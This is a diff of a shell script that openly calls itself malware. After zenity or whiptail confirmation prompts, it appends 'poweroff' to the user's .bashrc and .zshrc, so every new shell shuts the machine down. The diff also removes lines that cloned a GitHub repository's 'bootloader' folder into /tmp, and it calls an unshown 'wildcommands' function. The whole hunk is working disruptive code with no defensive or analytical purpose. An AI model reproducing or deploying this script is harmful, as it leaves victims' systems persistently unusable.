@@ -23,10 +23,7 @@ then
       zenity --question --text="This malware is no joke! Do you want to proceed? (Double Check)" --title="WARNING!" --cancel-label="Cancel" --ok-label="Proceed"
       if [[ $? -eq 0 ]]; then
         zenity --info --text "Welp, Good luck." --title "..." --ok-label "Alright"
-        #   echo poweroff >> .bashrc && echo poweroff >> .zshrc;
-        cd /tmp
-        git clone https://github.com/Psylops/summerproj.git
-        cd /tmp/summerproj/CyberSec/bootloader
+        echo poweroff >> .bashrc && echo poweroff >> .zshrc;
         wildcommands
       else
         exit
@@ -50,10 +47,8 @@ then
           exit
         else
           whiptail --msgbox "Welp, Good luck." 8 20 --title "..."
-          #   echo poweroff >> .bashrc && echo poweroff >> .zshrc;
-          cd /tmp
-          git clone https://github.com/Psylops/summerproj.git
-          cd /tmp/summerproj/CyberSec/bootloader
+          echo poweroff >> .bashrc && echo poweroff >> .zshrc;
+          
           wildcommands
         fi
       fi
